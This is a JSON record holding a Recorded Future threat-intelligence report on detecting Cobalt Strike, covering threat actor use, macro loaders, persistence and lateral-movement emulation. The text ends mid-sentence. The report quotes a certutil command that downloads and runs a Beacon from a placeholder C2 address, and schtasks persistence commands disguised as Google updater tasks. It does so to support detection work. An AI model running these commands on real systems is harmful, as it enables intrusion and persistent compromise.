{
    "id": "8bd8a228-13f6-4320-b552-9c9b59fc2626",
    "created_at": "2022-10-25T16:48:17.277568Z",
    "updated_at": "2025-03-27T02:16:16.88712Z",
    "deleted_at": null,
    "sha1_hash": "f19750cb89ed9c741fd3eafc98cef49f916a9843",
    "title": "Full-Spectrum Cobalt Strike Detection",
    "authors": "",
    "file_creation_date": "2021-09-13T17:57:35Z",
    "file_modification_date": "2021-09-13T17:59:06Z",
    "file_size": 3561631,
    "plain_text": "### MALWARE/\n\n TOOLS\n\n PROFILE\n\n## By Insikt Group®\n\nSeptember 14, 2021\n\n# Full-Spectrum Cobalt\n\n\n-----\n\n_This report is a technical profile of the commercial post-exploitation_\n_framework Cobalt Strike. It contains details on the capabilities of the_\n_framework, observed threat actor use, host-based and network-based_\n_detections, and SOAR strategies for detection and response. This report_\n_is intended for security operations audiences who focus on detection_\n_engineering._\n\n#### Executive Summary\n\nCobalt Strike is a commercial post-exploitation\ntool designed to aid penetration testers and red team\noperators in conducting authorized intrusions. Despite its\noriginal goal, since its release in 2012, Cobalt Strike has\ngained widespread popularity among state-sponsored\nthreat actors and financially motivated threat actors.\n\nCobalt Strike’s wide functionality supports all phases\nof a network intrusion, from reconnaissance and initial\naccess to credential dumping and data exfiltration. Even\nwith its broad feature set, it is still common for threat\nactors to use Cobalt Strike in combination with other\nmalware, like loaders, or to use Cobalt Strike to deliver\nransomware. Cisco Talos [reported that in the fourth](https://blog.talosintelligence.com/2020/09/CTIR-quarterly-trends-Q4-2020.html)\nquarter of 2020, 66% of all ransomware attacks involved\nCobalt Strike.\n\nDespite the age and prevalence of Cobalt Strike,\ndetection can still be difficult. The framework provides 2\nkey defense evasion features: Artifact Kit and Malleable\nC2 Profiles. Artifact Kit enables Cobalt Strike operators\nto customize the creation of payloads to avoid known\nsignatures for the tool. Malleable C2 Profiles enable\noperators to customize the details of the command and\ncontrol protocol used.\n\nDetecting and mitigating Cobalt Strike activity\nrequires a full spectrum of detections, including host\nand network-based detections. Starting before threat\nactors are even targeting your network, proactive\ndetection of new Cobalt Strike command-and-control\n(C2) servers will surface IP addresses and domains that\ncan be included in alert and blocklists. Other key points\nof detection include initial access vectors, persistence\ninstallation, and lateral movement.\n\n\nTo test detections using open-source Sigma rules and\ncustom Snort rules, Recorded Future acquired Cobalt Strike\nand conducted adversary emulation exercises using tactics,\ntechniques, and procedures (TTPs) from Ryuk, Chimera, and\nAPT41.\n\nCobalt Strike developers continue to improve the tool,\ngenerally to make it easier for operators to avoid detection.\nIn addition to the framework’s original developers, a large\ncommunity of security researchers regularly publish code, tools,\nand articles on how to make Cobalt Strike even more effective.\nCobalt Strike will very likely continue to be a threat in the future.\n\n#### Key Judgments\n\n  - Cobalt Strike is a prevalent tool among both state\nsponsored threat actors and financially motivated threat\nactors. Organizations of nearly any type and size may\nfind themselves defending against an attack conducted\nwith Cobalt Strike. Early detection of Cobalt Strike\ncan mitigate serious ransomware or state-sponsored\nintrusions.\n\n  - Effective detection of Cobalt Strike activity requires a full\n\nspectrum of detections, including host-based monitoring,\nnetwork-based monitoring, and threat intelligence to\nidentify Cobalt Strike C2s.\n\n  - Cobalt Strike is highly configurable, but many actors use\n\ndefault settings, such as SSL certs, Beacon URLs, and\nprofiles that offer defenders detection opportunities.\n\n  - Advanced threat actors will customize Cobalt Strike\n\npayloads to avoid detection better using built-in tools\nlike Artifact Kit, Malleable C2 Profiles, and Resource\nKit. Detection opportunities exist when threat actors\ncustomize one component but leave defaults in others.\n\n  - Based on continued official and third-party development\n\non Cobalt Strike features and capabilities, and the ability\nof any actor to obtain some version of it, Cobalt Strike\nwill continue to be a threat for the foreseeable future.\n\n\n-----\n\n### Table of Contents\n\n#### Executive Summary .......................................................................................................................... 1\n\n Key Judgments ................................................................................................................................ 1\n\n Background ...................................................................................................................................... 3\n##### Criminal Acquisitions ............................................................................................................................ 4\n\n#### Host-Based Detections .................................................................................................................... 4\n##### Initial Access ......................................................................................................................................... 5 Observed Threat Actor Use ......................................................................................................... 5 Description of Emulation ............................................................................................................. 5 Detection Techniques ................................................................................................................. 5 Static Variable Names ................................................................................................................. 5 Child Processes .......................................................................................................................... 7 Persistence ........................................................................................................................................... 7 Observed Threat Actor Use ......................................................................................................... 8 Detection Techniques ................................................................................................................. 9\n**_Initial Execution ............................................................................................................................. 9_**\n**_Creation of Scheduled Task ............................................................................................................. 9_**\n##### Lateral Movement .................................................................................................................................. 9 Observed Threat Actor Use ....................................................................................................... 10 Description of Emulation ........................................................................................................... 10\n**_Scenario 1: Make and Impersonate Token .............................................................................. 10_**\n**_Scenario 2: Kerberoasting Attack ......................................................................................... 11_**\n**_Scenario 3: AD Enumeration via SharpHound/BloodHound ........................................................ 12_**\n**_Scenario 4: Mimikatz and DCSync ........................................................................................ 12_**\n##### Detection Techniques ............................................................................................................... 14\n**_Named Pipes ..................................................................................................................... 14_**\n**_Abnormal Login Events ....................................................................................................... 14_**\n**_Rundll32 Sacrificial Process ................................................................................................ 15_**\n\n#### Network-Based Detections ............................................................................................................. 15\n##### Team Server Detection ........................................................................................................................ 15\n**_Shodan_** **............................................................................................................................ 16**\n**_Censys ............................................................................................................................. 16_**\n**_Recorded Future ................................................................................................................ 16_**\n**_InQuest ............................................................................................................................ 16_**\n##### Cobalt Strike Beacon Traffic Detection ................................................................................................ 16\n\n#### Advanced Detection and Automation .............................................................................................. 19\n##### Cobalt Strike Keylogger Detection and Response ................................................................................ 21 Cobalt Strike Keylogger Detection ............................................................................................ 21 Cobalt Strike Keylogger Response and Automation ................................................................... 21 Cobalt Strike Keylogger Containment, Analysis, and Eradication ............................................... 22 Cobalt Strike C2 Blocking .................................................................................................................... 22\n\n#### Outlook .................................................................................................................... ...................... 23\n\n\n-----\n\n_Figure 1: References to cracked Cobalt Strike on dark web forums from April 2016 to April 2021 (Source: Recorded Future)_\n\n\n#### Background\n\nCobalt Strike is a commercially available post-exploitation\nframework intended for penetration testers and legitimate red\nteam tests. The framework uses a feature-rich backdoor named\n“Beacon”, controlled via a Cobalt Strike Team Server. Beacon\nimplants can execute commands, implement keylogging, upload\nand download files, and implement other tooling or network\nfunctions.\n\nThe Team Server acts as a central management platform\nthat operators can connect to using the Cobalt Strike graphical\nuser interface (GUI). This GUI allows multiple operators to issue\ncommands, review exfiltrated data, and visualize the status of an\noperation simultaneously. The GUI is highly extensible, primarily\nthrough user-provided “Aggressor Scripts” that create interfaces\nto help execute preset lists of commands.\n\nRecorded Future has also observed Aggressor Scripts shared\namong ransomware affiliates to make it easier to run common\ncommands and manage additional payloads such as Bloodhound,\nMimikatz, and Rubeus.\n\n\nThe tool was developed and licensed by Strategic Cyber\nLLC, a company based in Washington, DC, and was [acquired](https://www.helpsystems.com/about/news/helpsystems-acquires-cobalt-strike-expand-core-security-business)\nby HelpSystems in March 2020. Cobalt Strike purchases are\nmonitored for illicit use by the firm, and sales of Cobalt Strike\nare subject to export controls. In 2010, the creator of Cobalt\n[Strike, Raphael Mudge, created a tool called Armitage that acted](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)\nas a graphical user interface (GUI) for the Metasploit Framework.\nIn 2012, Mudge released the first [version of Cobalt Strike that](https://www.cobaltstrike.com/releasenotes.txt)\nincluded the Cobalt Strike Beacon. Since 2012, Cobalt Strike has\nbeen developed continuously, with new features being added\nregularly. As of this writing, the most recent version is 4.3.\n\nA broad array of threat actors currently use Cobalt Strike to\nsupport initial access and move laterally through victim networks.\nThese include state-sponsored [espionage groups and](https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike) [criminal](https://blog.gigamon.com/2017/07/25/footprints-of-fin7-tracking-actor-patterns-part-1/)\n[organizations, including many active ransomware operators.](https://blog.gigamon.com/2017/07/25/footprints-of-fin7-tracking-actor-patterns-part-1/)\n\n\n-----\n\n##### Criminal Acquisitions\n\nDespite [export controls and vetting of sales of Cobalt](https://www.cobaltstrike.com/help-corp-compliance-ethics)\nStrike, several versions of Cobalt Strike have been leaked and\ndistributed online on both clearnet sites, such as [GitHub, and](https://www.binarydefense.com/threat_watch/decompiled-source-code-of-cobalt-strike-released-on-github/)\ndark web forums. In some cases, the digital rights management\n(DRM) and license enforcement mechanisms were removed, and\nthe resulting packages were delivered as “cracked” versions of\nCobalt Strike. Figure 1 shows dark web forum posts discussing\ncracked versions of Cobalt Strike from the last five years.\nBased on our data, dark web interest in Cobalt Strike has\nincreased significantly over the past year. The highest volume of\nreferences within Figure 1 from around November 2020 coincides\n[with reports of source code for Cobalt Strike version 4.0 being](https://securityaffairs.co/wordpress/110782/hacking/cobalt-strike-source-code.html)\nuploaded to GitHub.\n\nIn addition to the cracked standard versions of Cobalt Strike,\n[a trial version has also been used by threat actors such as APT41.](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html)\nThe trial version of Cobalt Strike lacks key evasion capabilities,\nsuch as the [ability to remove MZ headers when loading the](https://youtu.be/tzSkblL1fkI)\nBeacon DLL, and it contains artifacts that make detection of\nCobalt Strike activity even easier. For example, an older version\nof Cobalt Strike (3.0) [included the](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/) [EICAR string within the](https://www.eicar.org/?page_id=3950)\nheaders of all HTTP GET requests.\n\nSince the beginning of 2021, versions of Cobalt Strike have\nconsistently appeared in threads within underground sources\ncategorized as both low tier and high tier sources. The majority\nof references to “leaked” or “cracked” copies of Cobalt Strike\nduring this timeframe are predominantly for versions of Cobalt\n\n\nStrike labeled as version 4.0 and later. Within high-tier Russian\nlanguage sources, actors have freely shared links to file upload\nplatforms such as Anonfiles and Mega[.]nz containing leaked\nversions of Cobalt Strike at no extra cost. This contrasts with\nlow-tier sources, where users traditionally charge for access to a\ndownload link. Sellers on such sites are likely relying on the fact\nthat entry-level individuals are not aware that they can access\ncracked versions for free elsewhere.\n\n#### Host-Based Detections\n\nThe different components of the Cobalt Strike framework\nlead to different detection points across the kill chain, as seen\nin Figure 4. Detection of the initial access and Beacon activity\nis better suited for host-based detections via log detection with\na SIEM or the use of an endpoint detection and response (EDR)\ntool. The delivery of the Beacon and the C2 communication\n(defined by the Malleable C2 Profile) are best detected with\nnetwork detections using intrusion detection systems (IDS)\nlike Snort. In response to the widespread use of Cobalt Strike,\nsecurity researchers have developed many open-source YARA\nand Sigma detections.\n\n[In 2020, Talos released a report, “The art and science of](https://s3.amazonaws.com/talos-intelligence-site/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf?1600694964)\n[detecting Cobalt Strike”, detailing the internals of Cobalt Strike](https://s3.amazonaws.com/talos-intelligence-site/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf?1600694964)\nand how to detect the different stages of a Cobalt Strike attack.\nTheir detections focus primarily on Snort and ClamAV signatures.\n\n\n_Figure 2: A simplified overview of different points for detection of Cobalt Strike activity (Source: Recorded Future)_\n\n\n-----\n\nTo test host-based detections based on real malicious uses\nof Cobalt Strike, Recorded Future acquired a copy of Cobalt\nStrike and conducted adversary emulation exercises using\ntactics, techniques, and procedures (TTPs) from Ryuk, Chimera,\nand APT41 focusing on initial access, installing persistence, and\nmoving laterally.\n\n##### Initial Access\n\n Observed Threat Actor Use\n\nPhishing emails remain a significant intrusion vector. The\n[Verizon DBIR reported that in 2020, phishing had been reported](https://www.verizon.com/business/solutions/secure-your-business/business-security-tips/?cmp=knc:ggl:ac:ent:security:8003162844&utm_term=verizon%20data%20breach%20investigations%20report&utm_medium=knc&utm_source=ggl&utm_campaign=security&utm_content=ac:ent:8003162844&utm_term=verizon%20data%20breach%20investigations%20report&gclid=CjwKCAjw8cCGBhB6EiwAgORey9J4hpJl8wguBc-Uhl3jU-HZdG9Nn_16LHtzDjreGvv75OeMylzFKRoC5SUQAvD_BwE&gclsrc=aw.ds)\nin 36% of breaches, up 11% from 2019. Additionally, Craig Williams\nfrom Cisco Talos has [said, “Microsoft Office documents with](https://www.iheart.com/podcast/256-the-cyberwire-30949362/episode/poetrat-a-complete-lack-of-operational-73445574/)\nmalicious macros are still one of the top choices for attackers\nof all skill levels”.\n\nWhile there is minimal reporting on the use of Cobalt Strike[generated macros, the use of macros to deliver Cobalt Strike as](https://www.domaintools.com/resources/blog/covid-19-phishing-with-a-side-of-cobalt-strike)\n[well as other malware is still a common tactic. For that reason,](https://thedfirreport.com/2021/06/20/from-word-to-lateral-movement-in-1-hour/)\nwe decided to emulate an attack using Cobalt Strike-generated\nmacros.\n\n##### Description of Emulation\n\nThe Cobalt Strike macro loads and executes shellcode to\ndownload the Beacon from the Team Server. To understand the\nCobalt Strike macro payload, Insikt Group generated several\nmacros to identify what features would change. The code\nstructure of the generated Cobalt Strike macros had minimal\nchanges across each payload and can be identified by the import\nsection and the shellcode execution section. The first common\nsection in the generated macros is the Win32 function import\nsection shown in Figure 5. Insikt Group has observed the use\nof the statement, “#if VBA7 Then” combined with the imports\n“CreateRemoteThread”, ”VirtualAllocEx”, “WriteProcessMemory”\nand “CreateProcessA” to be present and follow the same\nstructure shown in Figure 5. This commonality was observed\nacross our generated macros as well as ones found in the wild.\n\n_Figure 3: Cobalt Strike macro initialization code (Source: Recorded Future)_\n\n\nAnother key aspect of Cobalt Strike macros is the method\nof shellcode execution shown in Figure 6. The shellcode to be\nexecuted is stored in an array, “myArray”, in an obfuscated form\nand is only deobfuscated in memory. This could allow the macro\nto evade signature detections looking for known shellcode\npatterns.\n\n##### Detection Techniques\n\n**_Static Variable Names_**\n\nThe variable containing the region of memory allocated and\nused to load the shellcode is called “rwxpage”. This variable\nname did not change between our generated macros. Based on\ndata from [InQuest Labs, Insikt Group found that this variable](https://labs.inquest.net/dfi/search/ext/ext_code/rwxpage)\nname was unique to Cobalt Strike macros.\n\n[The Cobalt Strike documentation suggests using Resource](https://www.cobaltstrike.com/help-resource-kit)\nKit to change the macro format. However, the Cobalt Strike\nversion we analyzed did not contain the Resource Kit. Between\nJanuary 2021 and June 2021, we identified 886 Cobalt Strike\nmacros containing the unmodified “rwxpage” variable name.\n\nThe Team Server C2s extracted from the macros had a low\ndetection rate both by Recorded Future’s proactive C2 detection\n(5% of C2s detected) and our open-source collection (10% of\nC2s detected). Our proactive C2 detection has since been\nupdated to include the results of Team Server C2s from Cobalt\nStrike macros. Over half of the extracted Team Server C2s were\nhosted in China, as seen in Figure 7. A full list of the extracted\n[C2s can be found on our GitHub repository.](https://github.com/Insikt-Group/Research/tree/master/CobaltStrike)\n\n\n-----\n\n_Figure 4: Cobalt Strike macro execution code (Source: Recorded Future)_\n\n_Figure 5: Breakdown of Cobalt Strike macro Team Servers by Country of ASN (Source: Recorded Future)_\n\n\n-----\n\n**_Child Processes_**\n\nBefore the shellcode is loaded into memory by the macro,\nthe process first spawns an instance of “rundll32.exe”. This\n“rundll32.exe” process acts as a disposable process for the\nshellcode to be allocated and then executed in. This technique\nof spawning disposable processes from macros is not unique to\nCobalt Strike. To detect this type of activity, you can use [this](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml)\nSigma rule to identify suspicious child processes of Microsoft\nOffice products.\n\n##### Persistence\n\nCobalt Strike doesn’t contain explicit commands for gaining\npersistence on an infected host. However, operators of Cobalt\nStrike can issue commands to create a variety of persistence\nmechanisms on infected Windows victims. To support this,\nCobalt Strike can create Beacon files that conform to the\nWindows Service specification, allowing the Beacons to function\nas Windows services.\n\nThe Cobalt Strike user community has developed a library\n[of automated scripts that contain the guided prompts to issue](https://blog.cobaltstrike.com/2015/03/05/scripting-beacons-and-deploying-persistence/)\ncommands needed to establish persistence on an infected\nvictim. These scripts make use of the Cobalt Strike automation\nknown as “Aggressor scripts”.\n\n_Figure 6: Cobalt Strike macro child process shellcode execution (Source: Recorded Future)_\n\n\n[Cobalt Strike’s documentation demonstrates using 2 possible](https://blog.cobaltstrike.com/2015/03/05/scripting-beacons-and-deploying-persistence/)\npersistence mechanisms:\n\n**• Event Triggered Execution (T1546)**\n\n**• Create or Modify System Process: Windows Service**\n\n**(T1543.003)**\n\n[A popular third-party repository of Aggressor scripts created](https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence)\nby GitHub user harleyQu1nn provides many more persistence\nmechanisms:\n\n**• Scheduled Task/Job: Scheduled Task (T1053.005)**\n\n**• Create or Modify System Process: Windows Service**\n\n**(T1543.003)**\n\n**• Event Triggered Execution: Windows Management**\n\n**Instrumentation Event Subscription (T1546.003)**\n\n**• Logon Initialization Scripts (T1037)**\n\n**• Boot or Logon Autostart Execution: Registry Run Keys**\n\n**(T1547)**\n\n**• BITS Jobs (T1197)**\n\nOther third-party repositories such as [Staykit and](https://github.com/0xthirteen/StayKit) [WMI-](https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1)\n[Persistence implement similar persistence techniques as the](https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1)\nharleyQu1nn repository. Despite the lack of explicit commands\nfor persistence in Cobalt Strike Beacon, the community has used\nfeatures from the framework like the Aggressor scripts to create\neasy-to-use interfaces for threat actors to issue commands to\ncreate persistence using Cobalt Strike.\n\n\n-----\n\n##### Observed Threat Actor Use\n\n[Windows scheduled tasks (T1053.005) are a common option](https://attack.mitre.org/techniques/T1053/005/)\nfor persistence that has been used by myriad threat actors in\nthe last year, including Chimera and [UNC2198 for ransomware](https://www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html)\ndelivery.\n\nChimera, likely a Chinese state-sponsored threat actor, has\ntargeted semiconductor firms and aviation entities. Taiwanese\n[cybersecurity firm CyCraft believed that an unknown Chinese-](https://i.blackhat.com/USA-20/Thursday/us-20-Chen-Operation-Chimera-APT-Operation-Targets-Semiconductor-Vendors.pdf?__cf_chl_captcha_tk__=16d249a66e8072632e3b84df4e240ab2ebf7a504-1618846494-0-AS9r2ypyhvTxDRq7oqTAJWZJ1aCWEZBkvWbnQdGKTBtFUpvf2vxpd6hzRb_3NRoQhFKlDtbobdF3eecB64S6j2j9HfPly04ZGtwsa4QbYN18YQH_MjjQzdG-FkJUyJk3HUOwa9LDemj1OpSijsPk0akh0JgnoDUK1FWSgjwAMJ_QkTJrVTzcG7Fq9fCSQY2pzlPSda0329tinjbWsfE7XMa7n8fBXQI94WC4kMhsu3h_zmYGR-3nQ1cCzGn2F7ERzNF6qFrUo9qMbDTIvV9NWSAIaS1PLp2fJThBq9g5iyMKQjW_93uM6ha6d6Zd0GOXLcIavpqjsVtAJ2fCTsVvXEIkl8UQSnw7wnAstpBuwMlPkLzzf5lkgZ8HppWS1hb2fn7GKBmHrlB6QUs76lZFEb_C4N43LEFaXkLt01OqYGQDw1p25JxMOkcmnQGqjFiQfcTS5IvdNV3sDUOv0zLvhTwW6CxBK6Scx-w2yqqUU8zqVf36U9QmQoOiYxamtw-5EDBZRTC1FL1wS92fb3WlMt70DTZDLvhAtFOlHbbHFL3HvmWNnP7O4t6KgpoloFLAopxwK5NW_KGtLezGe3_nT93eg1L3Qe1YGCIyVj1MRRf_3Kc3jQiN6MxfaEwQBOk2KnXXqGSbodpZCnfBNVt9KudZlX7B5IHmR7jw0InVbtvdPvlMbXuMKSWHE5nP8BsCFfySckiRI95mokWSbp23Otw)\nsponsored APT group had conducted the attacks to steal\nsemiconductor designs, source code, software development kits\n(SDKs), and other proprietary information.\n\nChimera [uses stolen credentials and password spraying](https://blog.fox-it.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/)\nas initial access, using administrative privileges to run a\n[PowerShell command to load Cobalt Strike into the memory of](https://medium.com/cycraft/taiwan-high-tech-ecosystem-targeted-by-foreign-apt-group-5473d2ad8730)\nthe compromised device. Additionally, the threat actors used\na C2 server hosted on Google’s or Microsoft’s cloud services,\nmaking their communications more difficult to detect. Chimera\noperators use Cobalt Strike as follows:\n\nChimera uses the Windows Task Scheduler (schtasks.exe)\nto execute Cobalt Strike both for [persistence and for single](https://cycraft.com/download/%5BTLP-White%5D20200415%20Chimera_V4.1.pdf)\n[executions. In one](https://blog.fox-it.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/) [campaign Chimera replaced the Google](https://i.blackhat.com/USA-20/Thursday/us-20-Chen-Operation-Chimera-APT-Operation-Targets-Semiconductor-Vendors.pdf?__cf_chl_captcha_tk__=16d249a66e8072632e3b84df4e240ab2ebf7a504-1618846494-0-AS9r2ypyhvTxDRq7oqTAJWZJ1aCWEZBkvWbnQdGKTBtFUpvf2vxpd6hzRb_3NRoQhFKlDtbobdF3eecB64S6j2j9HfPly04ZGtwsa4QbYN18YQH_MjjQzdG-FkJUyJk3HUOwa9LDemj1OpSijsPk0akh0JgnoDUK1FWSgjwAMJ_QkTJrVTzcG7Fq9fCSQY2pzlPSda0329tinjbWsfE7XMa7n8fBXQI94WC4kMhsu3h_zmYGR-3nQ1cCzGn2F7ERzNF6qFrUo9qMbDTIvV9NWSAIaS1PLp2fJThBq9g5iyMKQjW_93uM6ha6d6Zd0GOXLcIavpqjsVtAJ2fCTsVvXEIkl8UQSnw7wnAstpBuwMlPkLzzf5lkgZ8HppWS1hb2fn7GKBmHrlB6QUs76lZFEb_C4N43LEFaXkLt01OqYGQDw1p25JxMOkcmnQGqjFiQfcTS5IvdNV3sDUOv0zLvhTwW6CxBK6Scx-w2yqqUU8zqVf36U9QmQoOiYxamtw-5EDBZRTC1FL1wS92fb3WlMt70DTZDLvhAtFOlHbbHFL3HvmWNnP7O4t6KgpoloFLAopxwK5NW_KGtLezGe3_nT93eg1L3Qe1YGCIyVj1MRRf_3Kc3jQiN6MxfaEwQBOk2KnXXqGSbodpZCnfBNVt9KudZlX7B5IHmR7jw0InVbtvdPvlMbXuMKSWHE5nP8BsCFfySckiRI95mokWSbp23Otw)\nChrome updater executable and created a scheduled task to\nexecute it on system startup.\n```\nschtasks /create /s <Computer Name> “SYS­\nTEM” /tn “GoogleUpdateTaskMachine” /\ntr “\\”C:\\Program Files (x86)\\Google\\Up­\ndate\\1.3.35.342\\GoogleUpdate.exe\\”” /sc\nONSTART\n\n```\n_Figure 7: Command used by Chimera to create a scheduled task that executes on system startup_\n_[(Source: CyCraft)](https://cycraft.com/download/%5BTLP-White%5D20200415%20Chimera_V4.1.pdf)_\n```\nschtasks /create /ru “SYSTEM” /tn “up­\ndate” /tr “cmd /c c:\\windows\\temp\\update.\nbat” /sc once /f /st 06:59:00\n\n```\n_Figure 8: Command used by Chimera to create a scheduled task that executes once (Source:_\n_[CyCraft)](https://blog.fox-it.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/)_\n\n##### Description of Emulation\n\nTo emulate the persistence observed in the Chimera\ncampaigns, we used a lab environment consisting of a Windows\n10 Desktop VM acting as our victim and another Windows 10\nDesktop VM running Cobalt Strike Team Server. On the victim\n[VM, we ran Sysmon using the sysmon-module configuration.](https://github.com/olafhartong/sysmon-modular)\n\n\n_Figure 9: Command emulating APT41 to download and execute a Cobalt Strike Beacon (Source:_\n_Recorded Future)_\n\nFor initial execution in this test, in a command prompt, we\nexecuted certutil to download the Beacon Payload and begin\nexecution as seen in Figure 12. This command is almost identical\n[to the command executed by an exploit used by APT41 in March](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html)\n2020.\n```\ncmd /c certutil -urlcache -split -f\nhttp://<c2_ip>/2.exe && 2.exe\n\n```\n_Figure 10: Command emulating APT41 to download and execute a Cobalt Strike Beacon (Source:_\n_Recorded Future)_\n\nAfter the initial connection, we used the command getsystem\nto elevate our session’s privileges and then used the Cobalt\nStrike “run” command to execute schtasks to create a scheduled\ntask to run with system privileges that would execute on system\nstart, as seen in Figure 13.\n```\nschtasks /create /ru “SYSTEM” /tn “Goo­\ngleUpdateTaskMachine” /tr “C:\\Users\\IEUs­\ner\\2.exe” /sc ONSTART\n\n```\n_Figure 11: Command emulating Chimera to create a scheduled task that executes on system startup_\n_(Source: Recorded Future)_\n\nFollowing the successful installation of the scheduled task,\nwe rebooted the victim machine. When the machine finished\nrestarting, a new instance of the Cobalt Strike Beacon started,\nthis time running as the SYSTEM user. The full series of Beacon\nactivity and commands issued using Cobalt Strike can be seen\nin Figure 14.\n\n\n-----\n\n_Figure 12: Activity report from our schtasks efforts (Source: Recorded Future)_\n\n_Figure 13: Activity report from our schtasks efforts (Source: Recorded Future)_\n\n##### Detection Techniques\n\nThis simple emulation exercise produced relatively few\nSysmon and other log events that would provide opportunities\nfor detection. However, there are 2 key phases of the attack\nwhere detection and response are possible: initial execution and\nthe creation of the scheduled task.\n\n**_Initial Execution_**\n\nCertutil is [known as a “living off the land binary” (LOLBIN)](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)\nand has been used by APT41 to load Cobalt Strike. Certutil\n[can help do a variety of tasks related to certificates, including](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)\nconfiguring the Windows certificate authority and verifying\ncertificates. However, certutil also [has the ability to download](https://webcache.googleusercontent.com/search?q=cache:9KJtG6ufRsQJ:https://www.sentinelone.com/blog/malware-living-off-land-with-certutil/+&cd=1&hl=en&ct=clnk&gl=us)\narbitrary files and decode the contents of a file. This functionality\nis activated using command line flags that wouldn’t come up in\nbenign uses. The use of suspicious flags (such as the one used\nin our emulation “-urlcache”) in command lines can be detected\n[using this Sigma rule.](https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_susp_certutil_command.yml)\n\n**_Creation of Scheduled Task_**\n\nUsing schtasks.exe to create a new scheduled task results\nin a process being created with the command line containing\ndetails of the new scheduled task to be created. The flags used\nby the command may vary depending on the schedule and user\nfor the scheduled task, but generally, the commands can be\n[detected using this Sigma rule.](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_schtask_creation.yml)\n\n\nIn our emulation, because we escalated the Beacon’s session\nto have SYSTEM privileges using the command get SYSTEM,\nthe creation of our scheduled task was not detected using\nthe previously mentioned Sigma rule. To find the scheduled\ntask we created, we used Sysinternals Autoruns (running as\nAdministrator) to find the scheduled task. The output of that\ntool can be seen in Figure 15 on the top line with the entry name\n“GoogleUpdateTaskMachine” and the image path that ends in\n“2.exe”.\n\n##### Lateral Movement\n\nThreat actors typically, although not exclusively, acquire\na foothold on a network as a low-privileged user and move\nlaterally between systems to achieve their objectives. In an\nenterprise network using Microsoft Active Directory (AD), this\nmay entail compromising systems running as Domain Controllers\nor obtaining the highest level of Domain Admin or Enterprise\nAdmin privileges, effectively allowing complete control of an AD\nnetwork.\n\nCobalt Strike allows an attacker to move laterally between\nsystems, either by installing a Beacon payload on these systems\nor by using native Windows functionality to execute commands\nremotely. Cobalt Strike includes a functionality similar to the\nSysinternals PSExec tool and can also use Windows Management\nInstrumentation (WMI) or Windows Remote Management\n(WinRM) to run a new Beacon or one-off commands on remote\nsystems. Cobalt Strike features an [SMB Beacon that creates](https://www.cobaltstrike.com/help-smb-beacon)\na parent-child chain of Beacons (which can be running on the\nsame or different systems) before egressing out of the network\n\n\n-----\n\nthrough an HTTP(S) or DNS Beacon. Using this type of Beacon\n(rather than having HTTP(S) or DNS Beacons on each system)\ndecreases the number of external connections from a victim\nnetwork but also creates other detection opportunities. As with\nmany other cases, detections can be built around default values.\nWhile Cobalt Strike allows an operator to change many of these\ndefaults, and advises this in the documentation, in the wild,\nattackers will continue to make mistakes.\n\nTo aid in lateral movement, Cobalt Strike also includes several\nuser impersonation features. With administrator privileges on a\ncompromised system, an attacker can steal the access token of\na running process on that system, allowing them to effectively\nimpersonate the user account the process is running under\n(Access Token Manipulation: Token Impersonation/Theft,\n**[T1134.001). This can allow escalation to the SYSTEM user or](https://attack.mitre.org/techniques/T1134/001/)**\nimpersonation of another user account with desired privileges.\nA user without administrative privileges can also make an access\ntoken for another account, provided they have valid credentials\n(Access Token Manipulation: Make and Impersonate Token,\n**[T1134.003). We emulated both of these tactics to validate](https://attack.mitre.org/techniques/T1134/003/)**\nexisting detections.\n\n##### Observed Threat Actor Use\n\n[Three](https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/) [detailed](https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/) [reports of Ryuk ransomware compromises](https://thedfirreport.com/2021/01/31/bazar-no-ryuk/)\ndemonstrate some of the methods threat actors have used for\ndomain discovery and lateral movement once an initial foothold\nof a low-privilege Cobalt Strike beacon is established.\n\nIn these cases, the attackers used a combination of native\nWindows commands (“nltest” and “net” commands); PowerShell\n(the ActiveDirectory module and Powersploit framework); and the\ndomain discovery tool adfind. They used the Kerberos offensive\ntool Rubeus for a Kerberoasting attack. In 2 of these cases,\nthe attackers could trivially compromise a domain controller by\nexploiting the Zerologon vulnerability, effectively allowing them\nto remove the domain controller’s password. The attackers used\nseveral techniques for lateral movement, including RDP, PSExec,\nand Cobalt Strike’s SMB Beacon.\n\n##### Description of Emulation\n\nWe created a simple Active Directory lab environment to\nemulate certain lateral movement scenarios during this research,\nas seen in Figure 16, below. This lab environment consisted of one\nWindows Server system acting as a Domain Controller, another\nWindows Server system, and a Windows 10 client machine.\nThese machines were all on the same network segment, as was\nthe attacking machine running the Cobalt Strike Team Server and\ncontrol interface. Windows Defender was disabled to facilitate\ntesting. A range of user accounts with various privileges and\none service account were created on the testlab local domain\n\n\nNo changes were made to any of the Cobalt Strike default\noptions. Sysmon was running on each Windows system, using a\n[slight modification of the popular SwiftOnSecurity configuration.](https://github.com/SwiftOnSecurity/sysmon-config/pull/151)\nThese logs were then ingested into an ELK instance for further\nanalysis.\n\n_Figure 14: Emulation test lab setup (Source: Recorded Future)_\n\n**_Scenario 1: Make and Impersonate Token_**\n\nIn this scenario, a Beacon payload was run (via scripted\nweb delivery) from a low-privileged user 